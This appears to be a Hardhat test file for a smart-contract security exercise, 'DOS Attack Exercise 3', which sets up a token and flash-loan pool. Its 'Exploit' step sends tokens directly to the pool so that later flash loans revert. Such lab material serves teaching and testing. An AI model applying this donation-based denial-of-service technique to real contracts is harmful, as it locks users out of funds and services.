import { parse } from "path";

import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";

import { FlashLoanUser, TokenSale, Auction, ShibaPool, ShibaToken } from '../typechain-types';

const { deployContract, getSigners, parseEther } = ethers;

describe("DOS Attack Exercise 3", () => {
  let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;

  const INITIAL_SUPPLY = parseEther('1000000'); // 1 Million
  const TOKENS_IN_POOL = parseEther('100000'); // 100K
  const ATTACKER_TOKENS = parseEther('10'); // 10

  let token: ShibaToken;
  let pool: ShibaPool;

  let userContract: FlashLoanUser;

  before(async () => {
    [deployer, user, attacker] = await getSigners();

    // Deploy contracts
    token = await deployContract('ShibaToken', [INITIAL_SUPPLY]);
    pool = await deployContract('ShibaPool', [token.target]);

    // Send tokens
    await token.transfer(attacker.address, ATTACKER_TOKENS);
    await token.approve(pool.target, TOKENS_IN_POOL);
    await pool.depositTokens(TOKENS_IN_POOL);

    // Balances Check
    expect(await token.balanceOf(pool.target)).equals(TOKENS_IN_POOL);

    expect(await token.balanceOf(attacker.address)).equals(ATTACKER_TOKENS);

    // FlashLoan Check
    userContract = await deployContract('FlashLoanUser', [pool.target], user);
    await userContract.requestFlashLoan(10);
  });

  it('Exploit', async () => {
    await token.connect(attacker).transfer(pool.target, parseEther('1'));
  });

  after(async () => {
    await expect(userContract.requestFlashLoan(10)).to.be.reverted;
  });
});
